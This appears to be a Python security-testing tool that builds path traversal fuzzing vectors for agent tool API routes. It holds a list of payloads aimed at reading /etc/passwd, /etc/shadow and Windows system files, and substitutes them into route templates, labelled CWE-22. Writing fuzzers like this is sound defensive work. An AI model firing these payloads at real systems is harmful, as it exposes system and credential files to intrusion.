import urllib.parse, sys
sys.stdout.reconfigure(encoding='utf-8')

class AgenticOpenapiPathTraversalFuzzerClient:
    """
    Security vulnerability auditing engine for agent tool APIs.
    Synthesizes path traversal payloads (standard dot-dot-slash, double URL encoded,
    null byte terminates, Windows backslash escapes) to detect directory breakout flaws.
    """
    def __init__(self):
        self.mutation_patterns = [
            "../../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\..\..\..\windows\system.ini",
            "....//....//....//etc/passwd",
            "/var/log/../../../../etc/shadow",
            "file:///etc/passwd",
            "..;/..;/..;/etc/passwd",
            "..%00/etc/passwd"
        ]

    def fuzz_route(self, route_template, parameter_name):
        fuzz_vectors = []
        for pat in self.mutation_patterns:
            injected_route = route_template.replace(f"{{{parameter_name}}}", pat)
            encoded_route = route_template.replace(f"{{{parameter_name}}}", urllib.parse.quote(pat, safe=""))
            
            fuzz_vectors.append({
                "payload_pattern": pat,
                "injected_raw_path": injected_route,
                "injected_encoded_path": encoded_route,
                "risk_cwe": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory",
                "cvss_v3_severity": "HIGH (7.5)"
            })

        return {
            "status": "success",
            "route_template": route_template,
            "fuzzed_parameter": parameter_name,
            "total_vectors_generated": len(fuzz_vectors),
            "traversal_vectors": fuzz_vectors
        }
